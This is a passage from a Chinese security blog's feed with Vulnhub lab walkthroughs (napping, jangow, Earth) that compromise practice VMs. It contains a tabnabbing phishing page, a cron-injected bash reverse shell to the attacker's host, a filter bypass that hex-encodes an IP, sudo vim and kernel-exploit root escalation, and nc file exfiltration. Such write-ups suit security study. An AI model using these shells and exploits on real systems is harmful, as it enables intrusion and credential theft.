alt="image-20241021155900149"></p><p>我们发现没有办法成功运行，这个时候我们尝试去找和pass有关的文件</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">find / -name &#x27;*pass*&#x27; 2&gt;/dev/null</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/3b0ca380072842218807e1931674dd99.png" alt="3b0ca380072842218807e1931674dd99"></p><p>我们在这里成功发现了一个密码的备份文件，我们尝试用tar去压缩这个文件，然后再解压这个文件，这样把其移动到我们cyber用户的根目录下，然后把这个文件解压出来，再试试能不能获取其中的内容</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">./tar -czvf pass.tar.gz /var/backups/.old_pass.bak</span><br><span class="line">./tar -xzvf pass.tar.gz</span><br><span class="line">cat var/backups/.old_pass.bak</span><br></pre></td></tr></table></figure><p>我们成功获得了root的密码，如下所示</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20241021161635071.png" alt="image-20241021161635071"></p><p>接下来切换root模式即可</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20241021161812213.png" alt="image-20241021161812213"></p><p>但是还有一个问题，就是在这个界面没办法直接切换为root，所以我们再进行一步反弹shell即可</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20241021162057904.png" alt="image-20241021162057904"></p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20241021162653485.png" alt="image-20241021162653485"></p><p>成功找到第二个flag</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">3mp!r3&#123;You_Manage_To_BreakOut_From_My_System_Congratulation&#125;</span><br></pre></td></tr></table></figure><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><ol><li>brainfuck加密</li><li>enum4linux收集SMB服务信息，139和445端口对应SMB服务</li><li>使用tar命令将没有权限的文件转移到有权限的目录进行读取</li></ol>]]></content>
      
      
      <categories>
          
          <category> 网络攻防 </category>
          
          <category> 红蓝对抗 </category>
          
          <category> 红队入侵 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 实战打靶 </tag>
            
            <tag> 红队技战法 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Vulnhub打靶-napping</title>
      <link href="/post/5c352bf4.html"/>
      <url>/post/5c352bf4.html</url>
      
        <content type="html"><![CDATA[<h1 id="基本信息"><a href="#基本信息" class="headerlink" title="基本信息"></a>基本信息</h1><p>靶机下载：<code>https://download.vulnhub.com/napping/napping-1.0.1.ova</code></p><p>攻击机器：192.168.20.128（Windows操作系统）&amp; 192.168.20.138（kali）</p><p>提示信息：甚至管理员也可以在工作中睡着</p><p>靶机：192.168.20.0/24</p><p>目标：获取2个flag+root权限</p><h1 id="具体流程"><a href="#具体流程" class="headerlink" title="具体流程"></a>具体流程</h1><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><p>老样子首先使用<code>arp-scan -l</code>对主机进行探活，发现主机IP为<code>192.168.20.143</code></p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20241020124837667.png" alt="image-20241020124837667"></p><p>之后对开放的端口进行扫描，执行<code>nmap -O -sV -p- -A 192.168.20.143</code></p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20241020125025250.png" alt="image-20241020125025250"></p><p>开放端口为22和80，重点关注80端口即可，浏览器访问80端口</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20241020170418703.png" alt="image-20241020170418703"></p><p>我们首先扫一下目录，看看能不能有什么发现</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20241020170953327.png" alt="image-20241020170953327"></p><p>但是这几个页面都没有啥用，我们先试着注册一个用户登录进去，看看能不能有什么新的发现吧</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20241020171554012.png" alt="image-20241020171554012"></p><p>这里有一个框可以输入网址，当我们输入网址后，点击下面的here可以直接跳转，如下所示</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20241020181630641.png" alt="image-20241020181630641"></p><p>这里我们可以联想到ssrf漏洞，因为服务器会去请求我们给的资源地址，我们只需要构造恶意的文件地址，但是由于管理员会检查我们提交的URL，我看了一下WP，利用了一种我从来没听过的漏洞，在这里记录一下，也算当作学习了，这个漏洞的名字叫做tabnabbing</p><h2 id="tabnabbing漏洞利用"><a href="#tabnabbing漏洞利用" class="headerlink" title="tabnabbing漏洞利用"></a>tabnabbing漏洞利用</h2><h3 id="漏洞原理介绍"><a href="#漏洞原理介绍" class="headerlink" title="漏洞原理介绍"></a>漏洞原理介绍</h3><p>tabnabbing漏洞是一种钓鱼攻击漏洞，即反向标签劫持攻击，大致原理就是黑客通过某种方法在页面A中植入一个a标签，也就是一个超链接，即和我们本题中的输入框类似，链接我们认为的控制为我们精心准备的页面B，页面B的内容中有一个JavaScript代码，内容就是<code>window.opener.location=“C页面的链接”</code>，这句话的意思就是如果用户点击了该链接，就会自动跳转到C页面上，而C页面就是我们准备的和A页面一样的钓鱼页面，并且此时管理员并未发现A页面变成了C页面，进而继续在C页面上输入敏感信息，进而导致信息的泄露</p><h3 id="操作步骤"><a href="#操作步骤" class="headerlink" title="操作步骤"></a>操作步骤</h3><p>首先我们制作一个和原本页面一致的钓鱼页面，我们这里采取kali自带的<code>setookit</code>进行钓鱼网页的制作，具体步骤如下所示</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20241020231956562.png" alt="image-20241020231956562"></p><p>我们这里直接克隆了一个和其登录界面一致的钓鱼网页，这个时候我们在我们主机的web目录下创建一个html文件，代码如下</p><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>B页面<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">   <span class="keyword">if</span> (<span class="variable language_">window</span>.<span class="property">opener</span>) &#123;</span></span><br><span class="line"><span class="language-javascript">      <span class="variable language_">window</span>.<span class="property">opener</span>.<span class="property">location</span> = <span class="string">&quot;http://192.168.20.138/&quot;</span>;</span></span><br><span class="line"><span class="language-javascript">   &#125;<span class="keyword">else</span>&#123;<span class="title function_">alert</span>(<span class="string">&quot;跳转失败&quot;</span>);&#125;</span></span><br><span class="line"><span class="language-javascript">  </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>接着把地址放到输入框中，点击here，如下所示</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20241020232825485.png" alt="image-20241020232825485"></p><p>然后我们的监听端口返回了一串数据，就是admin登录这个界面的账号和密码，如下所示</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20241020232922869.png" alt="image-20241020232922869"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">账号：daniel</span><br><span class="line">密码：C@ughtm3napping123</span><br></pre></td></tr></table></figure><p>这里刚好对应上了本题的提示，管理员有时也会打盹，即管理员不够细心，未发现自己的登录界面已被钓鱼页面替换，所以我们的思路是正确的，我们使用xshell进行连接，猜测其进行了账号密码复用，由于开放了22号端口，所以我们直接尝试连接其服务器，如下所示</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20241021093148786.png" alt="image-20241021093148786"></p><h2 id="权限提升"><a href="#权限提升" class="headerlink" title="权限提升"></a>权限提升</h2><p>首先还是去把<code>linpeas.sh</code>下载下来，使用<code>wget http://192.168.20.1/linpeas.sh</code></p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20241021094112990.png" alt="image-20241021094112990"></p><p>我们执行<code>linpeas.sh</code>，看看能否为我们找到有用的信息，但是结果并没有什么可以利用的点，系统内核并没有什么太大的问题，我们接下来试试suid提权，<code>sudo -l</code>我查看过了，但是显示的是当前用户没有sudo权限，所以我们这里还是试一试suid提权，执行下述命令</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">find / -perm -u=s -type f 2&gt;/dev/null</span><br><span class="line">find / -user root -perm -4000 -exec ls -ldb &#123;&#125; \;</span><br><span class="line">find / -user root -perm -4000 -print 2&gt;/dev/null</span><br><span class="line">####三种命令都可以</span><br></pre></td></tr></table></figure><p>但是也并没有发现我们常用的suid提权方法，这个时候我们发现home目录下还有一个用户<code>adrian</code>，我们试着切换到另外一个用户目录下，并且尝试密码复用</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20241021095539103.png" alt="image-20241021095539103"></p><p>但是不幸的是，这里没有出现密码复用，所以我们只能用其他办法进入adrian用户，但是我们可以查看adrian用户下的目录，同时发现了第一个flag，但是现在目前无法打开，我们去看看其他两个文件</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20241021101756372.png" alt="image-20241021101756372"></p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">######## query.py ###############</span></span><br><span class="line"><span class="keyword">from</span> datetime <span class="keyword">import</span> datetime</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">now = datetime.now()</span><br><span class="line"></span><br><span class="line">r = requests.get(<span class="string">&#x27;http://127.0.0.1/&#x27;</span>)</span><br><span class="line"><span class="keyword">if</span> r.status_code == <span class="number">200</span>:</span><br><span class="line">    f = <span class="built_in">open</span>(<span class="string">&quot;site_status.txt&quot;</span>,<span class="string">&quot;a&quot;</span>)</span><br><span class="line">    dt_string = now.strftime(<span class="string">&quot;%d/%m/%Y %H:%M:%S&quot;</span>)</span><br><span class="line">    f.write(<span class="string">&quot;Site is Up: &quot;</span>)</span><br><span class="line">    f.write(dt_string)</span><br><span class="line">    f.write(<span class="string">&quot;\n&quot;</span>)</span><br><span class="line">    f.close()</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    f = <span class="built_in">open</span>(<span class="string">&quot;site_status.txt&quot;</span>,<span class="string">&quot;a&quot;</span>)</span><br><span class="line">    dt_string = now.strftime(<span class="string">&quot;%d/%m/%Y %H:%M:%S&quot;</span>)</span><br><span class="line">    f.write(<span class="string">&quot;Check Out Site: &quot;</span>)</span><br><span class="line">    f.write(dt_string)</span><br><span class="line">    f.write(<span class="string">&quot;\n&quot;</span>)</span><br><span class="line">    f.close()</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20241021102129325.png" alt="image-20241021102129325"></p><p>通过这两个文件，我们可以发现这是一个定时任务，每2分钟执行一次<code>query.py</code>，所以我们只需要在这里面添加执行反弹shell的语句即可，我们首先在<code>/tmp</code>目录下创建一个<code>shell.sh</code>文件</p><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="meta">#! /bin/bash</span></span><br><span class="line"></span><br><span class="line">bash -c <span class="string">&#x27;bash -i &gt;&amp; /dev/tcp/192.168.20.138/9001 0&gt;&amp;1&#x27;</span></span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20241021105402861.png" alt="image-20241021105402861"></p><p>接下来我们等几分钟，看看是否能够成功反弹shell</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20241021105419316.png" alt="image-20241021105419316"></p><p>成功以<code>adrian</code>用户登录上，接下来我们直接进行sudo提权，接着以上面的步骤进行</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20241021105622931.png" alt="image-20241021105622931"></p><p>我们发现可以通过vim进行root提权，我们直接输入<code>sudo vim -c &#39;:!/bin/sh&#39;</code>即可获得root权限</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20241021105804869.png" alt="image-20241021105804869"></p><p>我们也成功在root根目录下找到了root.txt</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20241021105943497.png" alt="image-20241021105943497"></p><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><ol><li>tabnabbing漏洞利用</li><li>利用定时任务进行反弹shell获取其他用户组权限</li><li>sudo vim 提权</li></ol>]]></content>
      
      
      <categories>
          
          <category> 网络攻防 </category>
          
          <category> 红蓝对抗 </category>
          
          <category> 红队入侵 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 实战打靶 </tag>
            
            <tag> 红队技战法 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Vulnhub打靶-jangow</title>
      <link href="/post/892458f3.html"/>
      <url>/post/892458f3.html</url>
      
        <content type="html"><![CDATA[<h1 id="基本信息"><a href="#基本信息" class="headerlink" title="基本信息"></a>基本信息</h1><p>靶机下载：<code>https://www.vulnhub.com/entry/jangow-101,754/</code></p><p>攻击机器：192.168.20.128（Windows操作系统）&amp; 192.168.20.138（kali）</p><p>提示信息：这个框的秘密是枚举！</p><p>靶机：192.168.20.0/24</p><p>目标：获取2个flag+root权限</p><h1 id="具体流程"><a href="#具体流程" class="headerlink" title="具体流程"></a>具体流程</h1><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><p>首先使用<code>arp-scan -l</code>查询IP，结果如下所示</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20241019163537628.png" alt="image-20241019163537628"></p><p>所以我们靶机对应的IP为<code>192.168.20.142</code></p><p>再使用nmap扫描靶机的端口，命令为<code>nmap -O -sV -p- -A 192.168.20.142</code></p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20241019164036012.png" alt="image-20241019164036012"></p><p>我们发现开启了80端口和21端口，即开启了http服务和ftp服务，我们先从80端口入手，浏览器访问80端口，如下所示</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20241019170054372.png" alt="image-20241019170054372"></p><p>首先还是先进行目录扫描，我们先使用dirsearch的默认字典看看有没有泄露，但是除了一些资源地址并没有什么新的发现</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20241019170627535.png" alt="image-20241019170627535"></p><p>我们这里发现了一个.backup文件，试着访问，信息如下</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20241019171739885.png" alt="image-20241019171739885"></p><p>是一个sql配置备份文件，在这里没什么作用，但是先把信息记录下来，后面可能会有用处</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$servername</span> = <span class="string">&quot;localhost&quot;</span>;</span><br><span class="line"><span class="variable">$database</span> = <span class="string">&quot;jangow01&quot;</span>;</span><br><span class="line"><span class="variable">$username</span> = <span class="string">&quot;jangow01&quot;</span>;</span><br><span class="line"><span class="variable">$password</span> = <span class="string">&quot;abygurl69&quot;</span>;</span><br><span class="line"><span class="comment">// Create connection</span></span><br><span class="line"><span class="variable">$conn</span> = <span class="title function_ invoke__">mysqli_connect</span>(<span class="variable">$servername</span>, <span class="variable">$username</span>, <span class="variable">$password</span>, <span class="variable">$database</span>);</span><br><span class="line"><span class="comment">// Check connection</span></span><br><span class="line"><span class="keyword">if</span> (!<span class="variable">$conn</span>) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;Connection failed: &quot;</span> . <span class="title function_ invoke__">mysqli_connect_error</span>());</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;Connected successfully&quot;</span>;</span><br><span class="line"><span class="title function_ invoke__">mysqli_close</span>(<span class="variable">$conn</span>);</span><br></pre></td></tr></table></figure><p>同时我们使用其他更大的字典的时候，发现扫出来了wordpress路径，如下所示</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20241019173540741.png" alt="image-20241019173540741"></p><p>我们直接访问该路径，具体页面如下所示</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20241019173857860.png" alt="image-20241019173857860"></p><p>我们点击访问Buscar，发现具有命令执行的php后门，如下所示</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20241019174244530.png" alt="image-20241019174244530"></p><p>我们直接尝试反弹shell</p><h2 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h2><p>通过尝试，我们发现普通的反弹shell会失败，即命令会被加载，但是一直反弹不成功，我们猜测可能是端口被限制了，我们试着使用80端口或者443端口，因为一般的服务器都不会限制80端口和443端口的流量</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20241019175352351.png" alt="image-20241019175352351"></p><p>成功获取到流量，接下来进行提权即可</p><h2 id="权限提升"><a href="#权限提升" class="headerlink" title="权限提升"></a>权限提升</h2><p>首先我们进入tmp目录，从我们的Windows主机上下载<code>linpeas.sh</code>，我们执行<code>wget http://192.168.20.1/linpeas.sh</code>，如下所示</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20241020112406413.png" alt="image-20241020112406413"></p><p>我们发现这里始终连接不上，应该也是靶机做了限制，所以我们这里使用ftp进行连接，因为靶机开放了21端口，而21端口刚好可以用来进行文件传输，这里我们猜测密码进行了复用，即刚刚发现的<code>.backup</code>文件</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">账号：jangow01</span><br><span class="line">密码：abygurl69</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20241020113243416.png" alt="image-20241020113243416"></p><p>成功上传到<code>/tmp</code>目录下，我们接下来就是加运行权限然后运行即可</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20241020113913338.png" alt="image-20241020113913338"></p><p>运行之后可以发现存在一个高危漏洞，所以我们直接下载exp上传到靶机上执行即可获取权限，执行以下命令</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">gcc 45010.c -o 45010</span><br><span class="line">chmod +x 45010</span><br><span class="line">./45010</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20241020114543803.png" alt="image-20241020114543803"></p><p>成功获取靶机root权限，接下来我们寻找两个flag</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20241020114752323.png" alt="image-20241020114752323"></p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20241020114830748.png" alt="image-20241020114830748"></p><p>本题到此全部攻克，难度比较小</p><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><ol><li>反弹shell限制端口的绕过</li><li>密码的复用</li><li>ftp的利用</li></ol>]]></content>
      
      
      <categories>
          
          <category> 网络攻防 </category>
          
          <category> 红蓝对抗 </category>
          
          <category> 红队入侵 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 实战打靶 </tag>
            
            <tag> 红队技战法 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Vulnhub打靶-Earth</title>
      <link href="/post/513f5538.html"/>
      <url>/post/513f5538.html</url>
      
        <content type="html"><![CDATA[<h1 id="基本信息"><a href="#基本信息" class="headerlink" title="基本信息"></a>基本信息</h1><p>靶机下载：<code>https://download.vulnhub.com/theplanets/Earth.ova</code></p><p>攻击机器：192.168.20.128（Windows操作系统）</p><p>靶机：192.168.20.0/24</p><p>目标：获取5个flag+root权限</p><h1 id="基本步骤"><a href="#基本步骤" class="headerlink" title="基本步骤"></a>基本步骤</h1><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><p>我们将靶机开启，首先使用nmap探活，查看主机精确IP，如下所示</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/fffa9937d0ed584052811cb91f2c5ee7.png" alt="fffa9937d0ed584052811cb91f2c5ee7"></p><p>我们靶机的IP为<code>192.168.20.140</code>，开放<code>80、443、22</code>端口，首先使用浏览器访问<code>80</code>端口，发现显示结果如下</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20241018134637172.png" alt="image-20241018134637172"></p><p>显示400BadRequest，就很疑惑，尝试使用443https协议访问也是有问题的，我们上网找一下这方面的相关解释</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20241018135003247.png" alt="image-20241018135003247"></p><p>大概率是因为我们不能直接通过IP访问，需要找到其正确的URL地址，我们使用nmap进行更详细的信息探测，使用命令如下</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nmap -O -sV -p- -A 192.168.20.140</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20241018135920978.png" alt="image-20241018135920978"></p><p>我们发现关键信息，给了DNS解析地址，即<code>earth.local</code>和<code>terratest.earth.local</code>，我们在host文件中加入对应的解析地址，如下所示</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20241018140403901.png" alt="image-20241018140403901"></p><p>在浏览器中我们直接使用域名进行访问，如下所示</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20241018140709003.png" alt="image-20241018140709003"></p><h2 id="漏洞初探"><a href="#漏洞初探" class="headerlink" title="漏洞初探"></a>漏洞初探</h2><p>我去试了试他界面给的那几串字符串，但是没发现任何有用的信息，所以还是先进行目录扫描吧，看看能不能有啥信息出现</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20241018142101782.png" alt="image-20241018142101782"></p><p>我们发现存在登录界面，我们尝试访问，看看有没有什么信息</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20241018142145415.png" alt="image-20241018142145415"></p><p>这个登陆框抓包了，但是没有任何有用的信息，sql注入用sqlmap跑了，现实的是没有注入漏洞，应该是其token值进行了限制，所以我们这里试着像上一篇文章一样，试着去看看有没有php后门或者txt文件泄露了相关的信息，相关命令如下所示</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">gobuster dir -u http://earth.local/ -x php,txt,jsp,asp -w &quot;C:\Users\Administrator\Desktop\目录字典\directory-list-2.3-medium.txt&quot;</span><br></pre></td></tr></table></figure><p>但是结果是啥都没扫出来，就当我非常绝望的时候，我想起来还有一个域名，而且肯定会在某个备份文件中有信息告诉我们前面的信息是如何进行加密的，所以我们试着去扫一扫另外一个域名下是否有相关信息，结果还真的扫出来了</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20241018150353910.png" alt="image-20241018150353910"></p><p>我们去看看这个robots.txt写了什么</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20241018150742174.png" alt="image-20241018150742174"></p><p>最后一个告诉了我们一个<code>testingnotes.*</code>的文件，我们猜测是txt文件或者php文件，我们都尝试一下</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20241018151108371.png" alt="image-20241018151108371"></p><p>我们翻译过来就是下面这句话</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20241018151353768.png" alt="image-20241018151353768"></p><p>告诉了我们如下几条信息</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1.使用XOR加密</span><br><span class="line">2.加密文件为testdata.txt</span><br><span class="line">3.用户名为terra</span><br></pre></td></tr></table></figure><p>我们访问testdata.txt文件，相关信息如下</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">According to radiometric dating estimation and other evidence, Earth formed over 4.5 billion years ago. Within the first billion years of Earth&#x27;s history, life appeared in the oceans and began to affect Earth&#x27;s atmosphere and surface, leading to the proliferation of anaerobic and, later, aerobic organisms. Some geological evidence indicates that life may have arisen as early as 4.1 billion years ago.</span><br></pre></td></tr></table></figure><p>脚本代码如下所示：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"> </span><br><span class="line">c =<span class="string">&quot;2402111b1a0705070a41000a431a000a0e0a0f04104601164d050f070c0f15540d1018000000000c0c06410f0901420e105c0d074d04181a01041c170d4f4c2c0c13000d430e0e1c0a0006410b420d074d55404645031b18040a03074d181104111b410f000a4c41335d1c1d040f4e070d04521201111f1d4d031d090f010e00471c07001647481a0b412b1217151a531b4304001e151b171a4441020e030741054418100c130b1745081c541c0b0949020211040d1b410f090142030153091b4d150153040714110b174c2c0c13000d441b410f13080d12145c0d0708410f1d014101011a050d0a084d540906090507090242150b141c1d08411e010a0d1b120d110d1d040e1a450c0e410f090407130b5601164d00001749411e151c061e454d0011170c0a080d470a1006055a010600124053360e1f1148040906010e130c00090d4e02130b05015a0b104d0800170c0213000d104c1d050000450f01070b47080318445c090308410f010c12171a48021f49080006091a48001d47514c50445601190108011d451817151a104c080a0e5a&quot;</span></span><br><span class="line">m =<span class="string">&quot;According to radiometric dating estimation and other evidence, Earth formed over 4.5 billion years ago. Within the first billion years of Earth&#x27;s history, life appeared in the oceans and began to affect Earth&#x27;s atmosphere and surface, leading to the proliferation of anaerobic and, later, aerobic organisms. Some geological evidence indicates that life may have arisen as early as 4.1 billion years ago.&quot;</span></span><br><span class="line"></span><br><span class="line">m_new = binascii.b2a_hex(m.encode(<span class="string">&quot;utf-8&quot;</span>))</span><br><span class="line">result = <span class="built_in">hex</span>(<span class="built_in">int</span>(c,<span class="number">16</span>) ^ <span class="built_in">int</span>(m_new,<span class="number">16</span>))</span><br><span class="line"><span class="built_in">print</span>(result)</span><br></pre></td></tr></table></figure><p>这里解密出来的十六进制数据再拿去转成字符串，得到如下结果</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">earthclimatechangebad4humansearthclimatechangebad4humansearthclimatechangebad4humansearthclimatechangebad4humansearthclimatechangebad4humansearthclimatechangebad4humansearthclimatechangebad4humansearthclimatechangebad4humansearthclimatechangebad4humansearthclimatechangebad4humansearthclimatechangebad4humansearthclimatechangebad4humansearthclimatechangebad4humansearthclimatechangebad4humansearthclimat</span><br></pre></td></tr></table></figure><p>这里面都是重复的字符串，所以我们猜测用户名为<code>terra</code>，密码为<code>earthclimatechangebad4humans</code></p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20241018191420824.png" alt="image-20241018191420824"></p><p>我们成功登录进去，发现有一个命令执行框，这下可以快乐的执行反弹shell了</p><h2 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h2><p>我们首先试试能不能直接任意命令执行，我们先随便试一试相关命令</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20241018191759569.png" alt="image-20241018191759569"></p><p>直接开始反弹shell，这里就不过多赘述</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/3a22686b9fa01e3b7781289a68f5e7ca.png" alt="3a22686b9fa01e3b7781289a68f5e7ca"></p><p>我们发现这里禁止了远程连接，但是我们又是必须要获取shell权限的，不然后面的权限提升没办法做，我们首先看看这个网站下这个页面的源代码，看看能不能有什么发现，在找的过程中顺带发现了第一个flag</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20241018194124577.png" alt="image-20241018194124577"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[user_flag_3353b67d6437f07ba7d34afd7d2fc27d]</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20241018194740015.png" alt="image-20241018194740015"></p><p>我们这里发现了这串代码对我们的反弹shell语句进行了过滤，仔细分析一下是对我们的IP地址进行了正则匹配，所以我们只需要将我们的IP地址转成十六进制即可</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/bin/bash -i &gt;&amp; /dev/tcp/0xC0A81480/9001 0&gt;&amp;1</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20241018195554509.png" alt="image-20241018195554509"></p><p>反弹shell成功，接下来进行提权即可</p><h2 id="权限提升"><a href="#权限提升" class="headerlink" title="权限提升"></a>权限提升</h2><p>我们这里试着使用suid提权，SUID（设置用户ID）是赋予文件的一种权限，它会出现在文件拥有者权限的执行位上，具有这种权限的文件会在其执行时，使调用者暂时获得该文件拥有者的权限，我们首先搜索符合条件的可以提权的程序</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">find / -perm -u=s -type f 2&gt;/dev/null</span><br><span class="line">find / -user root -perm -4000 -exec ls -ldb &#123;&#125; \;</span><br><span class="line">find / -user root -perm -4000 -print 2&gt;/dev/null</span><br><span class="line">####三种命令都可以</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20241018202111524.png" alt="image-20241018202111524"></p><p>但是这里面并没有我们常见的用来提权的几种程序，但是有一个<code>reset_root</code>非常的奇怪，我们试着直接运行这个程序</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20241018202752823.png" alt="image-20241018202752823"></p><p>发现失败了，这里我们只能将其传回本地分析了，使用nc可以传回来，我也是第一次遇见，所以这里稍微写详细一点</p><p>首先我们在kali攻击机上开一个接收端口，如下所示</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nc -l 4444 &gt; reset_root</span><br></pre></td></tr></table></figure><p>再通过nc将靶机上的文件传输过去</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nc 192.168.20.138 &lt; /usr/bin/reset_root</span><br></pre></td></tr></table></figure><p>我们传到靶机上后通过strace命令对其进行分析，分析结果如下所示</p><p><img 